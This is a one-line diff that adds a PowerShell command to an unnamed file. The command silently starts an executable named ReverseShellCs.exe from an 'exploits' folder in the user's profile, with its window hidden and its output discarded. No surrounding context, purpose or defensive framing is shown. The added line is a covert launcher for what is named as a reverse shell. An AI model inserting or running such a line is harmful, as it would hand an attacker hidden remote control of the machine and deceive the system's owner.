@@ -1,0 +1,1 @@
+Start-Process -FilePath "$env:USERPROFILE\exploits\ReverseShellCs.exe" -WindowStyle Hidden | Out-Null
